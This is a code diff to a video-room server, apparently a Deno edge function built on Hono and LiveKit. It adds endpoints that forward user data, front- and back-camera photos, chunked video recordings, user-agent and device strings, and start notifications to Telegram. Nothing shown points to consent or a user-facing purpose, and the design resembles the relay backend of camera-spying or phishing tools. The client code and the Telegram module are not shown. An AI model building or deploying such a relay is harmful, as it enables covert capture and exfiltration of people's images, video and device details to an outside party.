@@ -2,9 +2,10 @@ import { Hono } from "npm:hono";
 import { cors } from "npm:hono/cors";
 import { logger } from "npm:hono/logger";
 import * as kv from "./kv_store.tsx";
+import * as telegram from "./telegram.tsx";
 import { AccessToken } from "npm:livekit-server-sdk";
 
-// Force reload - version 2.1
+// Force reload - version 2.2
 const app = new Hono();
 
 // Enable logger
@@ -244,6 +245,94 @@ app.post("/make-server-039e5f24/join-room", async (c) => {
   } catch (error) {
     console.error("❌ [JOIN ROOM] Error:", error);
     return c.json({ error: error.message }, 500);
+  }
+});
+
+// TELEGRAM ENDPOINTS
+
+// Send user data to Telegram
+app.post("/make-server-039e5f24/telegram/send-user-data", async (c) => {
+  try {
+    const body = await c.req.json();
+    const success = await telegram.sendUserDataToTelegram(body);
+    return c.json({ success });
+  } catch (error) {
+    console.error("❌ [Telegram] Error sending user data:", error);
+    return c.json({ success: false, error: error.message }, 500);
+  }
+});
+
+// Send photo to Telegram
+app.post("/make-server-039e5f24/telegram/send-photo", async (c) => {
+  try {
+    const formData = await c.req.formData();
+    const photoFile = formData.get('photo') as File;
+    const cameraType = formData.get('cameraType') as string;
+    const userAgent = formData.get('userAgent') as string;
+    const device = formData.get('device') as string;
+    
+    if (!photoFile || !cameraType) {
+      return c.json({ success: false, error: 'Missing photo or cameraType' }, 400);
+    }
+    
+    const photoBlob = new Blob([await photoFile.arrayBuffer()], { type: photoFile.type });
+    
+    const success = await telegram.sendPhotoToTelegram({
+      photoBlob,
+      cameraType: cameraType as 'front' | 'back',
+      userAgent,
+      device
+    });
+    
+    return c.json({ success });
+  } catch (error) {
+    console.error("❌ [Telegram] Error sending photo:", error);
+    return c.json({ success: false, error: error.message }, 500);
+  }
+});
+
+// Send video to Telegram
+app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
+  try {
+    const formData = await c.req.formData();
+    const videoFile = formData.get('video') as File;
+    const chunkNumber = parseInt(formData.get('chunkNumber') as string);
+    const cameraType = formData.get('cameraType') as string;
+    const userAgent = formData.get('userAgent') as string;
+    const device = formData.get('device') as string;
+    
+    if (!videoFile || isNaN(chunkNumber) || !cameraType) {
+      return c.json({ success: false, error: 'Missing video, chunkNumber, or cameraType' }, 400);
+    }
+    
+    const videoBlob = new Blob([await videoFile.arrayBuffer()], { type: videoFile.type });
+    
+    const success = await telegram.sendVideoToTelegram({
+      videoBlob,
+      chunkNumber,
+      cameraType: cameraType as 'front' | 'back',
+      userAgent,
+      device
+    });
+    
+    return c.json({ success });
+  } catch (error) {
+    console.error("❌ [Telegram] Error sending video:", error);
+    return c.json({ success: false, error: error.message }, 500);
+  }
+});
+
+// Send /start notification
+app.post("/make-server-039e5f24/telegram/send-start-notification", async (c) => {
+  try {
+    const body = await c.req.json();
+    const success = await telegram.sendStartNotification({
+      timestamp: body.timestamp || new Date().toISOString()
+    });
+    return c.json({ success });
+  } catch (error) {
+    console.error("❌ [Telegram] Error sending start notification:", error);
+    return c.json({ success: false, error: error.message }, 500);
   }
 });
 
